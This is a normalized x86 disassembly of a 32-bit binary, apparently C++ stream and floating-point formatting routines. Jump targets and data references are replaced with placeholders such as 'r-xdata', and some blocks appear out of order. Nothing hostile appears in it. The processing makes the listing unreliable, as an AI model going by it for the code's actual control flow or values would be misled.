shl [ eax ] 0x1
shl [ eax + 0x1 ] 0x1
shl [ eax + 0x2 ] 0x1
shl [ eax + 0x3 ] 0x1
shl [ eax + 0x4 ] 0x1
shl [ eax + 0x5 ] 0x1
shl [ eax + 0x6 ] 0x1
shl [ eax + 0x7 ] 0x1
push eax
call sub_42e890
add esp 0x4
pop ebx
retn
sub_4262c0
push esi
mov esi [ edx + 0x10 ]
mov eax esi
cmp esi 0x5
jb r-xdata
cmp [ edx + 0x14 ] 0x10
jb r-xdata
mov eax 0x5
call sub_4249a0
test eax eax
jne r-xdata
mov edx [ edx ]
pop esi
retn
cmp esi 0x5
jae r-xdata
xor eax eax
cmp esi 0x5
setne al
or eax 0xffffffff
pop esi
retn
sub_426300
push ebp
mov ebp esp
push 0xffffffff
push sub_451c02
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
xor esi esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x28 ] ebx
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
cmp [ eax + ebx + 0xc ] esi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + ebx + 0xc ] 0x0
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + ebx + 0x3c ]
cmp eax esi
je r-xdata
mov edx [ ebx ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx ebx
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx ebx
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_428200
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
test esi esi
je r-xdata
mov esi eax
call sub_40ee80
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebx ]
mov edi [ ecx + 0x4 ]
mov esi [ edi + ebx + 0x38 ]
mov eax [ ecx + 0x4 ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x30 ] 0x0
mov dl [ edi + ebx + 0x40 ]
mov edi [ ebp + 0xc ]
push edi
mov [ ebp - 0x1c ] dl
mov edi [ ebp - 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x18 ]
push edi
add eax ebx
push eax
mov eax [ ebp - 0x30 ]
push esi
push eax
lea eax [ ebp - 0x30 ]
push eax
call edx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_436188
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx ebx
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
mov edi [ esi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x1c ]
not edi
call sub_4361b0
and edi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ esi + 0x4 ] eax
sub_426435
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_4264f0
push ebp
mov ebp esp
push 0xffffffff
push sub_45274f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x60 ] r--data
lea edi [ esi + 0x18 ]
push edi
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x10 ] 0x1
call sub_426750
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push edi
mov [ esi + ecx ] r--data
call sub_40fc90
mov [ edi ] r--data
mov [ edi + 0x3c ] ebx
mov [ edi + 0x40 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4265e0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_426620
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_4266b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_426650
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_4266b0
push ebp
mov ebp esp
push 0xffffffff
push sub_451bbb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_40f3d0
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_435d94
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_426750
push ebp
mov ebp esp
push 0xffffffff
push sub_4526fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
mov ecx esi
call sub_402e90
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_40fd80
mov [ esi + 0x40 ] al
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
push eax
mov ecx esi
call sub_402d50
sub_426800
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_451420
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x14 ]
test [ ebx + 0x14 ] 0x4000
mov esi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x10 ] al
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
mov ecx ebx
call sub_402e50
mov edi eax
mov [ esp + 0x78 ] 0x0
call sub_428340
mov [ esp + 0x78 ] 0xffffffff
mov edi [ esp + 0x18 ]
mov [ esp + 0x14 ] eax
test edi edi
je r-xdata
movzx eax [ ebp + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x1c ]
push eax
mov eax [ esp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
call edx
mov eax esi
jmp r-xdata
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
cmp [ ebp + 0x1c ] 0x0
mov ecx [ esp + 0x14 ]
mov [ esp + 0x78 ] 0x1
lea esi [ esp + 0x4c ]
je r-xdata
push 0x0
lea ecx [ esp + 0x24 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
call sub_409820
mov edi eax
lea esi [ esp + 0x30 ]
mov [ esp + 0x78 ] 0x3
call sub_405c40
mov esi 0x10
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] esi
jb r-xdata
call sub_427a10
mov edi eax
lea esi [ esp + 0x30 ]
mov [ esp + 0x78 ] 0x2
call sub_405c40
mov esi 0x10
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] esi
jb r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x20 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ ebx + 0x24 ] 0x0
mov edi [ ebx + 0x20 ]
mov eax [ esp + 0x40 ]
jl r-xdata
mov edx [ esp + 0x4c ]
push edx
mov ecx [ esp + 0x4c ]
push ecx
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
xor edi edi
jg r-xdata
call sub_43811c
add esp 0x4
mov ecx [ esp + 0x30 ]
cmp [ esp + 0x44 ] esi
jae r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov bl [ esp + 0x10 ]
push edx
push eax
mov eax edi
lea edi [ esp + 0x28 ]
call sub_4279b0
mov ecx [ eax ]
mov ebx [ esp + 0x30 ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x48 ]
add esp 0x8
mov [ ebp + 0x10 ] edx
xor edi edi
cmp edi eax
jbe r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
lea edx [ esp + 0x30 ]
push edx
call sub_427940
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0xc
xor edx edx
push eax
mov [ ebp + 0x10 ] eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x24 ] edx
mov bl [ esp + 0x14 ]
mov eax edi
mov edi [ esp + 0x20 ]
push ecx
call sub_4279b0
add esp 0x8
cmp [ esp + 0x44 ] esi
jb r-xdata
lea ecx [ esp + 0x30 ]
sub edi eax
jmp r-xdata
mov eax edi
mov eax [ esp + 0x30 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ ebx + 0x14 ]
and ecx 0x1c0
cmp ecx 0x40
je r-xdata
sub_426a50
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x1c ]
push ecx
push eax
mov edi r--data
lea eax [ esp + 0x1c ]
call sub_427640
push eax
lea ecx [ esp + 0x28 ]
push 0x40
push ecx
call sub_438b97
mov edx [ ebp + 0x18 ]
add esp 0x10
push eax
push edx
push esi
lea edx [ esp + 0x2c ]
mov ecx ebx
call sub_4276c0
mov ecx [ esp + 0x70 ]
add esp 0x14
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
sub_426ad0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x1c ]
push ecx
push eax
mov edi r--data
lea eax [ esp + 0x1c ]
call sub_427640
push eax
lea ecx [ esp + 0x28 ]
push 0x40
push ecx
call sub_438b97
mov edx [ ebp + 0x18 ]
add esp 0x10
push eax
push edx
push esi
lea edx [ esp + 0x2c ]
mov ecx ebx
call sub_4276c0
mov ecx [ esp + 0x70 ]
add esp 0x14
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
sub_426b50
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x20 ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
push ecx
mov edi r--data
lea eax [ esp + 0x20 ]
call sub_427640
push eax
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_438b97
add esp 0x14
push eax
mov eax [ ebp + 0x18 ]
push eax
push esi
lea edx [ esp + 0x2c ]
mov ecx ebx
call sub_4276c0
mov ecx [ esp + 0x70 ]
add esp 0x14
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
sub_426bd0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x20 ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
push ecx
mov edi r--data
lea eax [ esp + 0x20 ]
call sub_427640
push eax
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_438b97
add esp 0x14
push eax
mov eax [ ebp + 0x18 ]
push eax
push esi
lea edx [ esp + 0x2c ]
mov ecx ebx
call sub_4276c0
mov ecx [ esp + 0x70 ]
add esp 0x14
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
sub_426c50
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
push ebx
mov [ esp + 0x34 ] eax
mov eax [ ecx + 0x1c ]
push esi
mov esi [ ecx + 0x18 ]
push edi
mov [ esp + 0x38 ] ecx
test eax eax
jg r-xdata
mov ecx eax
test ecx ecx
jl r-xdata
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ecx + 0x14 ] 0x2000
jne r-xdata
test esi esi
jne r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + 0x34 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ esp + 0x38 ]
mov edx [ edx + 0x14 ]
mov eax edx
and eax 0x3000
xor ebx ebx
xor edi edi
cmp eax 0x2000
jne r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ esp + 0x33 ] bl
fxch st1
fxch st1
mov [ esp + 0x33 ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp ebx 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ eax + 0x2 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
mov [ eax + 0x3 ] 0x0
mov eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x60 ]
push 0x6c
push edx
call sub_438b97
mov ecx [ ebp + 0x18 ]
add esp 0x18
push eax
push esi
mov esi [ esp + 0x4c ]
push edi
lea eax [ esp + 0x5c ]
push eax
push ecx
mov ecx [ esp + 0x54 ]
push esi
mov edx ebx
call sub_4270d0
mov ecx [ esp + 0xdc ]
add esp 0x20
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add ebx 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x33 ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_426e60
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
push ebx
mov [ esp + 0x34 ] eax
mov eax [ ecx + 0x1c ]
push esi
mov esi [ ecx + 0x18 ]
push edi
mov [ esp + 0x38 ] ecx
test eax eax
jg r-xdata
mov ecx eax
test ecx ecx
jl r-xdata
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ecx + 0x14 ] 0x2000
jne r-xdata
test esi esi
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
mov [ esp + 0x33 ] bl
jmp r-xdata
mov [ esp + 0x33 ] 0x1
fchs
mov eax [ esp + 0x34 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ esp + 0x38 ]
mov edx [ edx + 0x14 ]
mov eax edx
and eax 0x3000
xor ebx ebx
xor edi edi
cmp eax 0x2000
jne r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp ebx 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add ebx 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ eax + 0x3 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
mov [ eax + 0x4 ] 0x0
mov eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x60 ]
push 0x6c
push edx
call sub_438b97
mov ecx [ ebp + 0x18 ]
add esp 0x18
push eax
push esi
mov esi [ esp + 0x4c ]
push edi
lea eax [ esp + 0x5c ]
push eax
push ecx
mov ecx [ esp + 0x54 ]
push esi
mov edx ebx
call sub_4270d0
mov ecx [ esp + 0xdc ]
add esp 0x20
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ esp + 0x33 ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_427060
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
call sub_438b97
mov ecx [ ebp + 0x18 ]
add esp 0x10
push eax
push ecx
push esi
lea edx [ esp + 0x1c ]
mov ecx edi
call sub_4276c0
mov ecx [ esp + 0x60 ]
add esp 0x14
pop edi
mov eax esi
pop esi
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x18
sub_4270d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4513cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov al [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x60 ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x49 ] al
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x1c ]
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] eax
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_428340
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x78 ] edi
test eax eax
je r-xdata
lea esi [ ebp - 0x48 ]
mov ecx edi
call sub_427c60
mov esi 0x1
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
xor ecx ecx
mov [ ebp - 0x4a ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x4 ] 0x2
mov al [ ebx ]
cmp al 0x2b
je r-xdata
mov esi eax
push 0x0
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x68 ] esi
call sub_436188
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x68 ] ecx
cmp al 0x2d
jne r-xdata
mov esi [ esi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x58 ]
not esi
call sub_4361b0
and esi [ ebp - 0x68 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x5c ] eax
call sub_438c6d
mov eax [ eax ]
mov esi [ ebp - 0x54 ]
mov cl [ eax ]
push esi
push 0x65
push ebx
mov [ ebp - 0x64 ] cl
mov [ ebp - 0x63 ] 0x65
call sub_438bc0
movsx edx [ ebp - 0x64 ]
add esp 0xc
push esi
push edx
push ebx
mov [ ebp - 0x58 ] eax
call sub_438bc0
mov edi eax
add esp 0xc
mov [ ebp - 0x70 ] edi
test edi edi
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ esi + 0x4 ] eax
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x5c ]
mov edx [ ebp - 0x80 ]
mov ecx [ edx + 0x20 ]
add eax esi
add eax [ ebp - 0x6c ]
add eax [ ebp - 0x60 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x58 ] 0x0
mov edi [ ebp - 0x58 ]
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx ecx [ ebp - 0x64 ]
push esi
push ecx
push ebx
call sub_438bc0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push esi
mov eax ebx
lea ecx [ ebp - 0x2c ]
call sub_409970
mov esi [ ebp - 0x58 ]
test esi esi
jne r-xdata
push esi
push 0x65
push ebx
call sub_438bc0
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp + 0x24 ]
sub eax ebx
mov bl [ ebp - 0x4a ]
lea esi [ eax + 0x1 ]
mov eax [ ebp + 0x20 ]
push edx
push eax
mov eax [ ebp - 0x50 ]
lea ecx [ esi - 0x1 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
call sub_427b90
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax [ ebp - 0x60 ]
push ecx
push edx
mov bl 0x30
lea edi [ ebp - 0x74 ]
call sub_4279b0
mov ecx [ eax ]
mov [ ebp + 0x20 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x24 ] edx
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
add esp 0x18
call edx
mov ecx [ ebp + 0x20 ]
mov bl al
mov eax [ ebp + 0x24 ]
push eax
push ecx
mov eax 0x1
lea edi [ ebp - 0x7c ]
call sub_4279b0
mov edx [ eax ]
mov [ ebp + 0x20 ] edx
mov ecx [ eax + 0x4 ]
